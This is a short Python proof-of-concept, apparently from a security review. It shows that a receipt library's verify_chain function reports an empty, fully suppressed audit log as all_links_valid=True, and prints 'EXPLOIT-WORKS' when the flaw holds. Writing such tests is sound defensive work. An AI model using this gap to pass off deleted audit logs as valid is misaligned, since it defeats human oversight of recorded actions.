#!/usr/bin/env python3
"""PoC 1 — S2.4/S2.6: EMPTY CHAIN validates as all_links_valid=True.

verify_chain([]) computes ok = all([]) == True. An attacker who suppresses
the ENTIRE audit log (or an auditor handed an empty bundle) gets
all_links_valid=True — a truthy "valid" signal on zero receipts.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import generate_keypair, verify_chain

sk, pk = generate_keypair()
result = verify_chain([], pk)
print("verify_chain([]) ->", {k: v for k, v in result.items() if k != "verdicts"})

# Unexpected valid: empty (fully suppressed) chain reports all links valid
if result["all_links_valid"] is True and result["length"] == 0:
    print("EXPLOIT-WORKS")
else:
    print("HELD")
